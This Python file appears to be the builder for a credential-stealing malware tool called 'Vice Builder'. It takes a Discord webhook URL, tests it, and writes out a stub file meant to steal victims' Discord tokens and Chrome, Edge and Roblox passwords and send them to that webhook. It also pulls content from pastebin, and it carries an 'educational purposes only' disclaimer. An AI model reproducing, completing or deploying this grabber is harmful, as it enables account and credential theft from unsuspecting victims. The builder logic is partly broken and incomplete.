
## --- IMPORTS
from fileinput import close
from json import load
import os
from subprocess import ABOVE_NORMAL_PRIORITY_CLASS
from turtle import title
from urllib import response
from venv import create
import colorama
from colorama import Fore, Back, Style
import dhooks
import asyncio
from time import sleep
import discord_webhook 
from discord_webhook import DiscordWebhook, DiscordEmbed
from numpy import r_
from multiprocessing import context
import hashlib
import requests

## extra stuff from import
colorama.init()
from dhooks import *

## start


print(f"""{Fore.RED} 
           ▌ ▐·▪   ▄▄· ▄▄▄ .                          
          ▪█·█▌██ ▐█ ▌▪▀▄.▀·                          
          ▐█▐█•▐█·██ ▄▄▐▀▀▪▄                          {Fore.CYAN} [{Fore.RED}!{Fore.CYAN}] Developed By @9thr On Github{Fore.RED}    
           ███ ▐█▌▐███▌▐█▄▄▌        {Fore.WHITE} [STUB]     {Fore.RED}                    
 ▀  ▀     . ▀  ▀▀▀·▀▀▀  ▀▀▀         {Fore.MAGENTA}                  
        ▄▄▄▄· ▄• ▄▌▪  ▄▄▌  ·▄▄▄▄  ▄▄▄ .▄▄▄            
        ▐█ ▀█▪█▪██▌██ ██•  ██▪ ██ ▀▄.▀·▀▄ █·          
        ▐█▀▀█▄█▌▐█▌▐█·██▪  ▐█· ▐█▌▐▀▀▪▄▐▀▀▄           
        ██▄▪▐█▐█▄█▌▐█▌▐█▌▐▌██. ██ ▐█▄▄▌▐█•█▌          
        ·▀▀▀▀  ▀▀▀ ▀▀▀.▀▀▀ ▀▀▀▀▀•  ▀▀▀ .▀  ▀     ▀  ▀ {Fore.LIGHTYELLOW_EX}    

    [1] : {Fore.RED}Create Stub{Fore.LIGHTYELLOW_EX}    
    [2] : {Fore.YELLOW}Contact{Fore.LIGHTYELLOW_EX}
    [3] : {Fore.GREEN}Info{Fore.LIGHTYELLOW_EX}
    [4] : {Fore.LIGHTBLACK_EX}Quit{Fore.LIGHTMAGENTA_EX}    

""")

options = input("[?] : ")

if options == '2':
    print(f"{Fore.WHITE}[{Fore.RED}*{Fore.WHITE}] My Current Contact(s) Are.. thr!#4321, @_thrrr (TT), twodifferentpovs (TT), & @thrte3n (ig).")

if options == '3':
    print(f"{Fore.GREEN}[?] Hello, my name is thr. This is a grabber software only made for EDUCATIONAL PURPOSES only. I did not make this software for malicous intent, use this software how you want. I am NOT responsible for YOUR actions with this software. Enjoy!")

if options == '4':
    print(f"Quitting, VICE.")
    os.close('main.py')

if options == '1':
    while True :
                print(f"{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] Loading..{Fore.RED}  ")
                sleep(3)
                yesno = input("[!] Loaded! Are You Sure You Want To Continue? (Y/N) : ")

                if yesno == 'Y':
                    while True:
                        os.system('cls')
                        print(f"""
                        {Fore.RED} 
             ▌ ▐·▪   ▄▄· ▄▄▄ .                          
            ▪█·█▌██ ▐█ ▌▪▀▄.▀·                          
            ▐█▐█•▐█·██ ▄▄▐▀▀▪▄                          {Fore.CYAN} [{Fore.RED}!{Fore.CYAN}] Developed By @9thr On Github{Fore.RED}    
             ███ ▐█▌▐███▌▐█▄▄▌          {Fore.WHITE} [STUB]     {Fore.RED}               
    ▀  ▀     . ▀  ▀▀▀·▀▀▀  ▀▀▀         {Fore.MAGENTA}                  
            ▄▄▄▄· ▄• ▄▌▪  ▄▄▌  ·▄▄▄▄  ▄▄▄ .▄▄▄            
            ▐█ ▀█▪█▪██▌██ ██•  ██▪ ██ ▀▄.▀·▀▄ █·          
            ▐█▀▀█▄█▌▐█▌▐█·██▪  ▐█· ▐█▌▐▀▀▪▄▐▀▀▄         
            ██▄▪▐█▐█▄█▌▐█▌▐█▌▐▌██. ██ ▐█▄▄▌▐█•█▌          
            ·▀▀▀▀  ▀▀▀ ▀▀▀.▀▀▀ ▀▀▀▀▀•  ▀▀▀ .▀  ▀     ▀  ▀ 


            {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] PLEASE READ BEFORE CONTINUING:

            {Fore.RED}[!]{Fore.WHITE} By Making A Stub, I Am {Fore.RED} NOT {Fore.WHITE}Responsible For {Fore.RED}YOUR{Fore.WHITE} Actions. 
            This Was Made For Educational Purposes, And It Will Steal The Victims Discord Tokens, 
            Chrome password's, Edge Passwords, And Roblox Passwords (All Located In PWDS.zip).{Fore.LIGHTYELLOW_EX}    
                        """)
                        webhookurll = input("[!] Enter Discord WebHook : ")
                        content = "WebHook Is Working! Go Back To ***VICE BUILDER***  To Finish Compiling Stub!"

                        webhook1 = DiscordWebhook(url=webhookurll, username="☆ Vice Builder ☆", content=content)

                        embed = DiscordEmbed(title="**SCRIPTED AND DEVELOPED BY @9THR ON GITHUB | thr!#4321 | @_thrrr | @eathan2poor**")
                        
                        webhook1.add_embed(embed)
                        response = webhook1.execute()
                        compile = input("[!] Sent Test To Webhook, Did You Receive It? (Y/N) : ")
                        if compile == 'Y':
                            print(f"""{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Great!""")
                            sleep(5)
                            print(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] Loading...{Fore.MAGENTA}""")
                            sleep(2)
                            print(f"{Fore.WHITE} [{Fore.RED}*{Fore.WHITE}]{Fore.LIGHTMAGENTA_EX} PLEASE DO NOT ENTER ANY INVALID CHARACTERS, OR ELSE THE FILE WILL NOT BE COMPILED. (P.S : DO {Fore.RED} NOT {Fore.LIGHTMAGENTA_EX} ADD FILE EXTENSION. JUST ADD THE NAME YOU WANT THE FILE TO BE!){Fore.RED}")
                            stubname = input("[?] Enter File Name : ")
                            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.LIGHTBLACK_EX} Compiling File, Please {Fore.RED}WAIT{Fore.LIGHTBLACK_EX}...")
                            sleep(1)
                            text = """from Crypto .Cipher import AES #line:2:from Crypto.Cipher import AES
from urllib .request import Request ,urlopen #line:3:from urllib.request import Request, urlopen
from re import findall #line:4:from re import findall
from io import BytesIO #line:5:from io import BytesIO
from zipfile import ZipFile #line:6:from zipfile import ZipFile
from colorama import Fore ,Back ,Style #line:7:from colorama import Fore, Back, Style
import os #line:9:import os
import json #line:10:import json
import base64 #line:11:import base64
import shutil #line:12:import shutil
import threading #line:13:import threading
import sqlite3 #line:14:import sqlite3
import win32crypt #line:15:import win32crypt
import Crypto #line:16:import Crypto
import colorama #line:17:import colorama
from dhooks import *#line:19:from dhooks import *
colorama .init ()#line:20:colorama.init()
userid ='@everyone - Devved By 9thr On GitHub'#line:22:userid = '@everyone - Devved By 9thr On GitHub' # - ( Input your discord tag if you want to be pinged ! )
webhookurl = Webhook ('"""

                            r = requests.get("https://pastebin.com/raw/nBiaLXK0")
                            y_textlmao = requests.get(b'https://pastebin.com/raw/dEz0B1Sq')
                            
                            with open(f"{stubname}.py", "w") as f:
                                ch=str
                                f.write(f"""{text}""" + webhookurll + """') 
""") 
                                os.startfile('DO_NOT_TOUCH.py')
                                


## ch=f.read(1)
# ch=str(ch,'utf-8')

                        else:
                                print(f"{Fore.WHITE} [{Fore.RED}*{Fore.WHITE}] ERROR! Please Try Again But Use A Capital 'Y' Or 'N' If You Didn't Previously. If Your WebHook Didn't Work, Try Again Or Make A New One.{Fore.CYAN}")
                                sleep(2)
                                input("[!] Press ENTER To Try Again.")
                                print(f"{Fore.GREEN} [+] Please Wait..")
                                sleep(3)
                                os.system('cls')
                else:
                    print(f"{Fore.WHITE} [{Fore.RED}*{Fore.WHITE}] ERROR! Please Try Again But Use A Capital 'Y' Or 'N' If You Didn't Previously.{Fore.CYAN}")
                    sleep(2)
                    input("[!] Press ENTER To Try Again.")
                    print(f"{Fore.GREEN} [+] Please Wait..")
                    sleep(3)
                    os.system('cls')

## pw_bytes = text.encode('utf-8')